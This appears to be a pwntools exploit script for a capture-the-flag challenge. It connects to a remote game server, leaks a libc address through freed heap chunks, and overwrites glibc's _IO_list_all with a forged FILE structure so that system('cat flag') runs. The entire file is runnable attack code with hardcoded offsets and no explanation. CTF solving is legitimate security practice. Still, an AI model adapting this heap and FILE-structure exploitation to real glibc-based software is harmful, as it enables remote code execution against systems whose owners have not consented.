#!/usr/bin/env python
# coding: utf-8

from pwn import *

p = remote('arcade.fluxfingers.net', 1810)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_remote = {
	'base': 0x0,
	'unsorted_bin': 0x1beb00,
	'free_hook': 0x1c0748,
	'top_chunk': 0x1beb00,
	'system': 0x45380,
	'io_list_all': 0x1bf4c0,
	'io_str_jumps': 0x1bb1c0,
	'chain': 0x1bf628,
	'ptr1': 0x1c0720,
	'ptr2': 0x1be720,
	'ptr3': 0x1bb100,
	'ptr4': 0x1bf4e0,
	'ptr5': 0x1bf5c0,
	'ptr6': 0x1be860,
	'ptr7': 0x24480

}

libc = libc_remote

elf = {
	'base': 0x0, 
	'leaked': 0x1670,
	'mmaped': 0x4048
}

heap = {
	'base': 0x0,
	'leaked': 0x290,
	'ptr': 0x280
}

mmap = {
	'base': 0x0,
	'leaked': 0x880,
	'libc_ptr': 0x120 * 7 + 0x10
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base
	
def write(sz, offset, payload):
	ru('exit\n')
	sel('1')
	ru('write?\n')
	sel(str(sz & 0xFFFFFFFFFFFFFFFF))
	ru('offset?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))
	time.sleep(1)
	se(payload)

def free(offset):
	ru('exit\n')
	sel('2')
	ru('free?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))

def leak(offset):
	ru('exit\n')
	sel('3')
	ru('leak?\n')
	sel(str(offset & 0xFFFFFFFFFFFFFFFF))

addr = 0x10000
ru(')?\n')
sel(str(addr))
set_base(mmap, 'base', addr)

payload = (p64(0) + p64(0x101) + 'C' * 0xf0 + p64(0) + p64(0x21) + 'D' * 0x10) * 3
write(len(payload), 0, payload)
write(len(payload), 0+len(payload), payload)
write(len(payload), 0+len(payload)*2, payload)
for i in range(8):
	free(i * 0x120 + 0x10)

leak(0x120 * 7 + 0x10 + 1)
leaked = pick64('\0' + rud('\n'))
set_base(libc, 'unsorted_bin', leaked)

print('[+] libc base @ %#x' % libc['base'])

payload = 'cat flag\0'
write(len(payload), 0x1000, payload)

file_struct = p64(0) + p64(0) + p64(1) + p64(0) + p64(0) + p64(1) + p64(0) + p64(addr+0x1000) + p64(0)
payload = file_struct.ljust(0xd8, '\0') + p64(libc['io_str_jumps']-8) + p64(0) + p64(libc['system'])
write(len(payload), 0, payload)

payload = p64(addr)
payload += p64(1) + '\xFF' * 8 + p64(0) + p64(libc['ptr1']) + '\xFF' * 8 + p64(0) + p64(libc['ptr2']) + '\0' * 0x18 + p64(0xFFFFFFFF) + p64(0) + p64(0) + p64(libc['ptr3']) + p64(libc['ptr4']) + p64(libc['ptr5']) + p64(libc['ptr6']) + p64(libc['ptr7'])
payload += '\0' * (libc['free_hook']-libc['chain']-len(payload))
payload += p64(libc['system'])
write(0x20001, libc['io_list_all'], p64(addr))
write(0x20001, libc['chain'] - addr, payload[:0x300])
for i in range(0x300, len(payload), 0x300):
	se(payload[i:i+0x300])
	time.sleep(1)
p.shutdown('send')
print(p.recvall())

p.interactive()
